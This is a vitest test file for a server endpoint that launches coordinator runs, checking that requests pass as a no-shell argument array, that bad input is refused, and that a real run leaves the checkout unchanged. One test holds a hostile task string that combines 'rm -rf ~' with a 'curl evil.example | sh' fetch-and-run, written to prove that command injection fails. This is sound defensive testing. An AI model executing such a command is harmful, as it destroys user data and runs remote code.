/**
 * `POST /api/runs` (FR084, AT27): the page starts work only through the
 * coordinator, as one argument array, never through a shell — and refuses
 * what the coordinator would refuse before any process exists.
 */
import { spawn, type ChildProcess, type SpawnOptions } from 'node:child_process';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';
import { FAKE_SCENARIO_ENV } from '../../src/adapters/index.js';
import { parseCliArgs } from '../../src/cli/index.js';
import { startOfficeServer, type OfficeServer, type OfficeServerOptions } from '../../src/server/index.js';
import type { CliInvocation, Spawner } from '../../src/server/launch.js';
import { git } from '../../src/workspaces/git.js';
import { cleanupAll, fingerprintCheckout, fixTheBugScenario, registerCleanup, tempDir, useFixture, writeFakeAgentsConfig, writeScenario } from '../workspaces/support.js';
import { rawRequest, sleep, startRequest, tokenFrom } from './support.js';

afterEach(() => cleanupAll());

const REPO_ROOT = fileURLToPath(new URL('../..', import.meta.url));
const CLI_ENTRY = fileURLToPath(new URL('../../src/cli/index.ts', import.meta.url));
const STUB_INVOCATION: CliInvocation = { command: '/opt/workforce/bin/node', args: ['--import', 'tsx', '/opt/workforce/src/cli/index.ts'], cwd: REPO_ROOT };

interface SpawnCall {
  readonly command: string;
  readonly args: ReadonlyArray<string>;
  readonly options: SpawnOptions;
}

/** Records what the launcher asked to execute, then runs a tiny stand-in with the same stdio. */
function recordingSpawner(script: string): { calls: SpawnCall[]; children: ChildProcess[]; spawner: Spawner } {
  const calls: SpawnCall[] = [];
  const children: ChildProcess[] = [];
  const spawner: Spawner = (command, args, options) => {
    calls.push({ command, args: [...args], options });
    const child = spawn(process.execPath, ['-e', script], { ...options, shell: false });
    children.push(child);
    registerCleanup(() => {
      if (child.exitCode === null) child.kill('SIGKILL');
    });
    return child;
  };
  return { calls, children, spawner };
}

async function office(stateRoot: string, extra: Partial<OfficeServerOptions>): Promise<{ server: OfficeServer; token: string }> {
  const server = await startOfficeServer({ stateRoot, port: 0, discover: async () => [], ...extra });
  registerCleanup(() => void server.close());
  return { server, token: await tokenFrom(server) };
}

function body(response: { body: string }): Record<string, any> {
  return JSON.parse(response.body) as Record<string, any>;
}

const CREATED = `process.stdout.write(JSON.stringify({ type: 'run.created', runId: 'run-from-stub' }) + '\\n')`;

describe('a start request that the coordinator would refuse is refused before any process starts', () => {
  it('refuses a bad body, a bad repository, a missing base, an unknown agent and an unacknowledged unconfined runtime', async () => {
    const stateRoot = tempDir('workforce-start-refuse-');
    writeFakeAgentsConfig(stateRoot);
    const fixture = await useFixture('ts-bug');
    const notGit = tempDir('workforce-start-notgit-');
    const unborn = tempDir('workforce-start-unborn-');
    await git(['init', '--quiet'], { cwd: unborn });

    const { calls, spawner } = recordingSpawner(CREATED);
    const { server, token } = await office(stateRoot, { spawner, cliInvocation: STUB_INVOCATION });

    const cases: Array<{ input: unknown; code: string }> = [
      { input: 'this is not json', code: 'invalid_json' },
      { input: {}, code: 'invalid_body' },
      { input: { repo: fixture.path, task: 'Fix it.', shell: true }, code: 'invalid_body' },
      { input: { repo: fixture.path, task: '   \n ' }, code: 'invalid_body' },
      { input: { repo: fixture.path, task: 'Fix it.', agent: '../engineer' }, code: 'invalid_body' },
      { input: { repo: fixture.path, task: 'Fix it.', allowUnconfinedWrites: 'yes' }, code: 'invalid_body' },
      { input: { repo: 'relative/checkout', task: 'Fix it.' }, code: 'repo_not_absolute' },
      { input: { repo: path.join(notGit, 'missing'), task: 'Fix it.' }, code: 'invalid_repo' },
      { input: { repo: notGit, task: 'Fix it.' }, code: 'not_a_git_repository' },
      { input: { repo: unborn, task: 'Fix it.' }, code: 'no_committed_base' },
      { input: { repo: fixture.path, task: 'Fix it.', agent: 'nobody', allowUnconfinedWrites: true }, code: 'unknown_agent' },
      { input: { repo: fixture.path, task: 'Fix it.' }, code: 'write_boundary_unsupported' },
      { input: { repo: fixture.path, task: 'Fix it.', allowUnconfinedWrites: false }, code: 'write_boundary_unsupported' },
    ];
    for (const entry of cases) {
      const response = await startRequest(server, token, entry.input);
      expect({ code: body(response).error.code, status: response.status }).toEqual({ code: entry.code, status: 400 });
    }
    expect(calls).toHaveLength(0);
  });

  it('refuses a start when no agent configuration can be found for the repository', async () => {
    const stateRoot = tempDir('workforce-start-noconfig-');
    const fixture = await useFixture('ts-bug');
    const { calls, spawner } = recordingSpawner(CREATED);
    const { server, token } = await office(stateRoot, { spawner, cliInvocation: STUB_INVOCATION, env: { PATH: process.env['PATH'] ?? '' } });
    const response = await startRequest(server, token, { repo: fixture.path, task: 'Fix it.', allowUnconfinedWrites: true });
    expect(response.status).toBe(400);
    expect(body(response).error.code).toBe('missing_agents');
    expect(calls).toHaveLength(0);
  });
});

describe('a valid start request becomes exactly one `workforce run --json` argument array', () => {
  it('never uses a shell, and the coordinator’s own parser reads back exactly the hostile text that was sent', async () => {
    const stateRoot = tempDir('workforce-start-argv-');
    writeFakeAgentsConfig(stateRoot);
    const fixture = await useFixture('ts-bug');
    const { calls, spawner } = recordingSpawner(CREATED);
    const { server, token } = await office(stateRoot, { spawner, cliInvocation: STUB_INVOCATION });

    const hostile = `Fix it"; rm -rf ~ && $(curl https://evil.example | sh) \`id\` > /tmp/owned\n--state-dir=/tmp/elsewhere --agents=/tmp/evil.json -- --help`;
    const response = await startRequest(server, token, { repo: fixture.path, task: hostile, agent: 'engineer', allowUnconfinedWrites: true });
    expect(response.status).toBe(201);
    expect(body(response)).toMatchObject({ ok: true, runId: 'run-from-stub', statusPath: '/api/runs/run-from-stub' });

    expect(calls).toHaveLength(1);
    const [call] = calls;
    expect(call!.options.shell).toBe(false);
    expect(call!.options.detached).toBe(true);
    expect((call!.options.stdio as unknown[])[0]).toBe('ignore');
    expect(call!.command).toBe(STUB_INVOCATION.command);
    expect(call!.args.slice(0, STUB_INVOCATION.args.length)).toEqual(STUB_INVOCATION.args);

    const cliArgv = call!.args.slice(STUB_INVOCATION.args.length);
    expect(cliArgv.slice(0, 2)).toEqual(['run', '--json']);
    expect(cliArgv.filter((argument) => argument.includes('rm -rf'))).toEqual([`--task=${hostile}`]);

    const parsed = parseCliArgs(cliArgv);
    expect(parsed.command).toBe('run');
    expect(parsed.positionals).toEqual([]);
    expect(parsed.task).toBe(hostile);
    expect(parsed.repo).toBe(fixture.path);
    expect(parsed.stateDir).toBe(stateRoot);
    expect(parsed.agents).toBe(path.join(stateRoot, 'agents.json'));
    expect(parsed.agent).toBe('engineer');
    expect(parsed.allowUnconfinedWrites).toBe(true);
    expect(parsed.json).toBe(true);
    expect(parsed.help).toBe(false);
  });

  it("relays the coordinator's own refusal, with its own code, when the run process exits before recording a run", async () => {
    const stateRoot = tempDir('workforce-start-relay-');
    writeFakeAgentsConfig(stateRoot);
    const fixture = await useFixture('ts-bug');
    const refusal = (exitCode: number, code: string) =>
      `process.stdout.write(JSON.stringify({ ok: false, command: 'run', exitCode: ${exitCode}, error: { code: '${code}', message: 'refused by the coordinator', details: ['detail line'] } }) + '\\n'); process.exit(${exitCode})`;

    const locked = recordingSpawner(refusal(4, 'coordinator_lock_held'));
    const first = await office(stateRoot, { spawner: locked.spawner, cliInvocation: STUB_INVOCATION });
    const busy = await startRequest(first.server, first.token, { repo: fixture.path, task: 'Fix it.', allowUnconfinedWrites: true });
    expect(busy.status).toBe(409);
    expect(body(busy).error).toMatchObject({ code: 'coordinator_lock_held', message: 'refused by the coordinator' });
    expect(body(busy).error.details[0]).toBe('detail line');

    const untested = recordingSpawner(refusal(2, 'write_boundary_untested_version'));
    const second = await office(stateRoot, { spawner: untested.spawner, cliInvocation: STUB_INVOCATION });
    const invalid = await startRequest(second.server, second.token, { repo: fixture.path, task: 'Fix it.', allowUnconfinedWrites: true });
    expect(invalid.status).toBe(400);
    expect(body(invalid).error.code).toBe('write_boundary_untested_version');
  });

  it('takes one start at a time, and reports a run process that never records a run instead of waiting for ever', async () => {
    const stateRoot = tempDir('workforce-start-inflight-');
    writeFakeAgentsConfig(stateRoot);
    const fixture = await useFixture('ts-bug');
    const slow = recordingSpawner(`setTimeout(() => {}, 5000)`);
    const { server, token } = await office(stateRoot, { spawner: slow.spawner, cliInvocation: STUB_INVOCATION, launchTimeoutMs: 1_500 });

    const pending = startRequest(server, token, { repo: fixture.path, task: 'Fix it.', allowUnconfinedWrites: true });
    const deadline = Date.now() + 10_000;
    while (slow.calls.length === 0 && Date.now() < deadline) await sleep(10);
    expect(slow.calls).toHaveLength(1);

    const second = await startRequest(server, token, { repo: fixture.path, task: 'Fix it again.', allowUnconfinedWrites: true });
    expect(second.status).toBe(409);
    expect(body(second).error.code).toBe('launch_in_progress');

    const first = await pending;
    expect(first.status).toBe(504);
    expect(body(first).error.code).toBe('run_not_recorded_yet');
    expect(slow.calls).toHaveLength(1);
  });
});

describe('end to end: a start request becomes a real coordinator run', () => {
  it('runs `workforce run` for real, and the verifier — not the page — accepts the candidate; the checkout is untouched', async () => {
    const stateRoot = tempDir('workforce-start-e2e-');
    writeFakeAgentsConfig(stateRoot);
    const fixture = await useFixture('ts-bug');
    const before = await fingerprintCheckout(fixture.path);

    const previous = process.env[FAKE_SCENARIO_ENV];
    process.env[FAKE_SCENARIO_ENV] = writeScenario(fixTheBugScenario());
    registerCleanup(() => {
      if (previous === undefined) delete process.env[FAKE_SCENARIO_ENV];
      else process.env[FAKE_SCENARIO_ENV] = previous;
    });

    const { server, token } = await office(stateRoot, {
      cliInvocation: { command: process.execPath, args: ['--import', 'tsx', CLI_ENTRY], cwd: REPO_ROOT },
      env: { ...process.env, NODE_NO_WARNINGS: '1' },
    });
    const response = await startRequest(server, token, { repo: fixture.path, task: 'Fix the pagination bug.', allowUnconfinedWrites: true });
    expect(response.status).toBe(201);
    const { runId, pid } = body(response) as { runId: string; pid: number };
    expect(typeof runId).toBe('string');

    let document: Record<string, any> = {};
    const deadline = Date.now() + 120_000;
    for (;;) {
      document = body(await rawRequest(server, { path: `/api/runs/${runId}` }));
      if (['ready_for_review', 'failed', 'interrupted', 'cancelled'].includes(document.run?.state)) break;
      if (Date.now() > deadline) throw new Error(`run ${runId} did not finish; last state ${document.run?.state}`);
      await sleep(250);
    }
    expect(document.run.state).toBe('ready_for_review');
    expect(document.tasks[0].state).toBe('accepted');
    expect(document.checks[0]).toMatchObject({ outcome: 'passed', evidenceProvenance: 'verifier_executed' });

    const runs = body(await rawRequest(server, { path: '/api/runs' }));
    expect(runs.runs[0].id).toBe(runId);

    // The run process exits on its own once the run is over.
    const exitDeadline = Date.now() + 30_000;
    const alive = () => {
      try {
        process.kill(pid, 0);
        return true;
      } catch {
        return false;
      }
    };
    while (alive() && Date.now() < exitDeadline) await sleep(100);
    expect(alive()).toBe(false);
    expect(await fingerprintCheckout(fixture.path)).toEqual(before);
  }, 180_000);
});
